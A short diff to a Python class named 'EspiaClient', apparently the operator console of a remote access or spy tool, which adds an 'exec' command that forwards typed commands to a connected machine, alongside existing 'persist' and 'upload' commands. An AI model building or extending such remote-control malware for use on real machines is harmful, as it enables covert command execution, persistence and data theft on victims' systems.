@@ -43,8 +43,8 @@ class EspiaClient(threading.Thread):
                 continue
             elif (command == "persist"):
                 self.connection.send(command.encode("utf-16le"))
-            elif (command == ""):
-                pass
+            elif (command == "exec"):
+                self.connection.send(input_text.encode("utf-16le"))
             elif (command == "upload"):
                 try:
                     f = open(parameters[0], "rb")
@@ -67,6 +67,8 @@ class EspiaClient(threading.Thread):
                     self.connection.sendall(text)
 
                 continue
+            elif (command == ""):
+                pass
             else:
                 msg = input_text.encode("utf-16le")
                 print(msg)
